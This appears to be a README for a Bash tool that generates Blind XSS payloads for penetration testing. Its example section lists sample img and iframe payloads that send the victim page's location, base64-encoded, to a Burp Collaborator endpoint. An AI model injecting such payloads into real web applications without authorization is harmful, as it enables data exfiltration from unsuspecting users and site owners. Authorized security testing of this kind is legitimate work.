# Blind XSS Payload Generator

A simple, customizable Blind XSS payload generator tool for penetration testers and security researchers. This script takes user input for a Burp Collaborator or similar endpoint URL, replaces placeholders in pre-defined Blind XSS payloads, and outputs a ready-to-use list of payloads that can be used in security assessments.

# Features
- Pre-defined Blind XSS payloads for various scenarios
- Easy customization of payloads by specifying your endpoint URL
- Generates payloads that trigger callbacks with valuable information from vulnerable web applications

# Requirements
- Bash (Unix-based OS recommended)
- curl (for testing and verification, if needed)

# Usage
1. Clone the repository:

```
git clone https://github.com/yourusername/blind_xss_payload_generator.git
cd blind-xss-payload-generator
```

2. Run the script:

```
./generate_payloads.sh
```

The script will ask for:

- A Burp Collaborator or similar URL
- A filename for saving the generated payloads

3. Inspect the output: The output file (e.g., blind_xss_payloads.txt) will contain customized Blind XSS payloads using your specified endpoint URL.

# Example

```
$ ./generate_payloads.sh
Enter your Burp Collaborator URL: https://example.burpcollaborator.net
Enter the output filename (e.g., blind_xss_payloads.txt): my_blind_xss_payloads.txt
```

Payloads generated and saved to my_blind_xss_payloads.txt

Some examples of the generated payloads:

```html
<img src="https://example.burpcollaborator.net/image">
<img src="https://example.burpcollaborator.net/image-only" onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>
<iframe srcdoc='<script>window.location="https://example.burpcollaborator.net/iframe-srcdoc?"+btoa(parent.document.location)</script>'></iframe>
```

# Notes
Testing in Legal Environments: This tool should only be used in environments where you have permission to perform security assessments. Unauthorized testing may violate laws and ethical guidelines.

Customization: The payloads can be modified directly in the script or via del.txt and blind_xss_payloads.txt files for even more variations.

# License
This project is licensed under the MIT License.


